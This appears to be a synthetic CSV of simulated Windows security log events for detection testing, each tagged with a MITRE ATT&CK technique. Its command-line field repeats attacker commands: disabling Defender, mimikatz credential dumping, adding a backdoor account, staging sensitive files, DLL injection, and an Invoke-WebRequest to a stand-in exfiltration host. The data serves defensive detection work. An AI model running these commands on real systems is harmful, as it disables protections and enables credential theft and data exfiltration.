timestamp,sourcetype,EventCode,MITRE_Technique,Description,CommandLine,NewProcessName,Source_Network_Address,DestinationPort,User,ParentProcessName
2024-05-28T16:10:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.126,,user,C:\Windows\System32\cmd.exe
2024-05-28T16:15:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.127,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T16:20:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.128,,user,C:\Windows\System32\cmd.exe
2024-05-28T16:25:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.129,,user,C:\Windows\System32\explorer.exe
2024-05-28T16:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.130,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T16:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.131,,user,C:\Windows\System32\explorer.exe
2024-05-28T16:40:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.132,8080.0,user,C:\Windows\System32\cmd.exe
2024-05-28T16:45:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 33,C:\Simulated\mstsc.exe,192.168.56.133,3389.0,attacker,C:\Windows\System32\explorer.exe
2024-05-28T16:50:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.134,,user,C:\Windows\System32\explorer.exe
2024-05-28T16:55:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.135,,user,C:\Windows\System32\cmd.exe
2024-05-28T17:00:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.136,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T17:05:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.137,,user,C:\Windows\System32\cmd.exe
2024-05-28T17:10:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.138,,user,C:\Windows\System32\cmd.exe
2024-05-28T17:15:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.139,,attacker,C:\Windows\System32\explorer.exe
2024-05-28T17:20:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.140,,user,C:\Windows\System32\cmd.exe
2024-05-28T17:25:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.141,,user,C:\Windows\System32\explorer.exe
2024-05-28T17:30:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.142,8080.0,attacker,C:\Windows\System32\cmd.exe
2024-05-28T17:35:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 43,C:\Simulated\mstsc.exe,192.168.56.143,3389.0,user,C:\Windows\System32\explorer.exe
2024-05-28T17:40:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.144,,user,C:\Windows\System32\explorer.exe
2024-05-28T17:45:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.145,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T17:50:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.146,,user,C:\Windows\System32\cmd.exe
2024-05-28T17:55:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.147,,user,C:\Windows\System32\cmd.exe
2024-05-28T18:00:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.148,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T18:05:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.149,,user,C:\Windows\System32\explorer.exe
2024-05-28T18:10:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.100,,user,C:\Windows\System32\cmd.exe
2024-05-28T18:15:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.101,,attacker,C:\Windows\System32\explorer.exe
2024-05-28T18:20:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.102,8080.0,user,C:\Windows\System32\cmd.exe
2024-05-28T18:25:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 53,C:\Simulated\mstsc.exe,192.168.56.103,3389.0,user,C:\Windows\System32\explorer.exe
2024-05-28T18:30:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.104,,attacker,C:\Windows\System32\explorer.exe
2024-05-28T18:35:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.105,,user,C:\Windows\System32\cmd.exe
2024-05-28T18:40:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.106,,user,C:\Windows\System32\cmd.exe
2024-05-28T18:45:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.107,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T18:50:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.108,,user,C:\Windows\System32\cmd.exe
2024-05-28T18:55:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.109,,user,C:\Windows\System32\explorer.exe
2024-05-28T19:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.110,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T19:05:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.111,,user,C:\Windows\System32\explorer.exe
2024-05-28T19:10:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.112,8080.0,user,C:\Windows\System32\cmd.exe
2024-05-28T19:15:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 63,C:\Simulated\mstsc.exe,192.168.56.113,3389.0,attacker,C:\Windows\System32\explorer.exe
2024-05-28T19:20:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.114,,user,C:\Windows\System32\explorer.exe
2024-05-28T19:25:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.115,,user,C:\Windows\System32\cmd.exe
2024-05-28T19:30:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.116,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T19:35:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.117,,user,C:\Windows\System32\cmd.exe
2024-05-28T19:40:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.118,,user,C:\Windows\System32\cmd.exe
2024-05-28T19:45:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.119,,attacker,C:\Windows\System32\explorer.exe
2024-05-28T19:50:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.120,,user,C:\Windows\System32\cmd.exe
2024-05-28T19:55:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.121,,user,C:\Windows\System32\explorer.exe
2024-05-28T20:00:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.122,8080.0,attacker,C:\Windows\System32\cmd.exe
2024-05-28T20:05:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 73,C:\Simulated\mstsc.exe,192.168.56.123,3389.0,user,C:\Windows\System32\explorer.exe
2024-05-28T20:10:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.124,,user,C:\Windows\System32\explorer.exe
2024-05-28T20:15:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.125,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T20:20:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.126,,user,C:\Windows\System32\cmd.exe
2024-05-28T20:25:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.127,,user,C:\Windows\System32\cmd.exe
2024-05-28T20:30:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.128,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T20:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.129,,user,C:\Windows\System32\explorer.exe
2024-05-28T20:40:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.130,,user,C:\Windows\System32\cmd.exe
2024-05-28T20:45:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.131,,attacker,C:\Windows\System32\explorer.exe
2024-05-28T20:50:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.132,8080.0,user,C:\Windows\System32\cmd.exe
2024-05-28T20:55:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 83,C:\Simulated\mstsc.exe,192.168.56.133,3389.0,user,C:\Windows\System32\explorer.exe
2024-05-28T21:00:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.134,,attacker,C:\Windows\System32\explorer.exe
2024-05-28T21:05:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.135,,user,C:\Windows\System32\cmd.exe
2024-05-28T21:10:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.136,,user,C:\Windows\System32\cmd.exe
2024-05-28T21:15:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.137,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T21:20:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.138,,user,C:\Windows\System32\cmd.exe
2024-05-28T21:25:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.139,,user,C:\Windows\System32\explorer.exe
2024-05-28T21:30:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.140,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T21:35:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.141,,user,C:\Windows\System32\explorer.exe
2024-05-28T21:40:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.142,8080.0,user,C:\Windows\System32\cmd.exe
2024-05-28T21:45:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 93,C:\Simulated\mstsc.exe,192.168.56.143,3389.0,attacker,C:\Windows\System32\explorer.exe
2024-05-28T21:50:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.144,,user,C:\Windows\System32\explorer.exe
2024-05-28T21:55:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.145,,user,C:\Windows\System32\cmd.exe
2024-05-28T22:00:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.146,,attacker,C:\Windows\System32\cmd.exe
2024-05-28T22:05:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.147,,user,C:\Windows\System32\cmd.exe
2024-05-28T22:10:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.148,,user,C:\Windows\System32\cmd.exe
2024-05-28T22:15:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.149,,attacker,C:\Windows\System32\explorer.exe
